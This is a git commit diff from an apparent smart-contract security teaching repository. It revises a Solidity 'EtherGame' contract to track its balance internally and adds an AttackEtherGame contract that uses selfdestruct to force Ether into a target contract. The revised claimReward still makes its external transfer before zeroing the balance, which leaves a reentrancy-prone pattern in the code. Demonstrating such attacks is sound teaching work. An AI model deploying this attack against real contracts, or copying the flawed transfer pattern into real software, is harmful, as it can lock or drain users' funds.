82b523676e1c9a2d56fa7a5fc8b59e3abddd3544
ChunWeiYeah <yher25@gmail.com>
2022-04-28 21:19:58 +0800

    補上Selfdestruct的敘述 並補上範例

--- Hack/Selfdestruct/EtherGame.sol
+++ Hack/Selfdestruct/EtherGame.sol
@@ -2,25 +2,44 @@
 pragma solidity ^0.7.6;
 
 contract EtherGame {
-    uint256 public targetAmount = 3 ether;
+    uint256 public targetAmount = 10 ether;
     address public winner;
+    address owner;
+    uint256 public balance;
+    bool isEnd;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(owner == msg.sender);
+        _;
+    }
+
+    function withdrawAfterEnd() public payable onlyOwner {
+        require(isEnd, "Game not finish yet.");
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
 
     function deposit() public payable {
         require(msg.value == 1 ether, "You can only send 1 Ether");
 
-        uint256 balance = address(this).balance;
+        balance += msg.value;
         require(balance <= targetAmount, "Game over");
 
         if (balance == targetAmount) {
             winner = msg.sender;
+            isEnd = true;
         }
     }
 
     function claimReward() public {
         require(msg.sender == winner, "Not winner");
-
-        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        (bool sent, ) = msg.sender.call{value: balance}("");
         require(sent, "Failed to send Ether");
+        balance = 0;
     }
 
     function getBalance() public view returns (uint256) {
@@ -28,15 +47,13 @@ contract EtherGame {
     }
 }
 
-contract Attack {
-    EtherGame etherGame;
-
-    constructor(EtherGame _etherGame) {
-        etherGame = EtherGame(_etherGame);
+contract AttackEtherGame {
+    function attack(address _attackedAddress) public payable {
+        address payable addr = payable(address(_attackedAddress));
+        selfdestruct(addr);
     }
 
-    function attack() public payable {
-        address payable addr = payable(address(etherGame));
-        selfdestruct(addr);
+    function getAddress() public view returns (address) {
+        return address(this);
     }
 }
